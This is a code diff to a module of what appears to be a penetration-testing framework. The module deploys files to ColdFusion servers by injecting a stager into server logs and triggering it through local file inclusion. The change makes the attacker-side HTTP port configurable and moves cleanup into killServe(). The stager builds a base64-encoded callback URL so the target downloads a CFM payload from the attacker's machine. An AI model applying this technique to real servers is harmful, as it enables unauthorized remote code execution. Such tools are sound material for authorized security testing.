@@ -1,11 +1,12 @@
 from src.platform.coldfusion.interfaces import CINTERFACES
-from src.module.deploy_utils import parse_war_path, _serve, waitServe
+from src.module.deploy_utils import parse_war_path, _serve, waitServe, killServe
 from threading import Thread
 from base64 import b64encode
 from os.path import abspath
 from urllib import quote_plus
 from requests import get
 from log import LOG
+import state
 import utility
 
 title = CINTERFACES.CFM
@@ -36,7 +37,8 @@ def deploy(fingerengine, fingerprint):
 
     # inject stager
     utility.Msg("Injecting stager...")
-    b64addr = b64encode('http://{0}:8000/{1}'.format(utility.local_address(), cfm_file))
+    b64addr = b64encode('http://{0}:{1}/{2}'.format(utility.local_address(), 
+                                             state.external_port,cfm_file))
     stager = quote_plus(stager.format(b64addr, cfm_file))
  
     stager += ".cfml" # trigger the error for log injection
@@ -52,13 +54,7 @@ def deploy(fingerengine, fingerprint):
         utility.Msg("{0} deployed at /{0}".format(cfm_file), LOG.SUCCESS)
     else:
         utility.Msg("Failed to deploy file.", LOG.ERROR)
-
-        # kill local HTTP server
-        try:
-            get("http://localhost:8000", timeout=1.0)
-        except:
-            pass
-
+        killServe()
 
 def invokeLFI(base, fingerengine, fingerprint):            
     """ Invoke the LFI based on the version
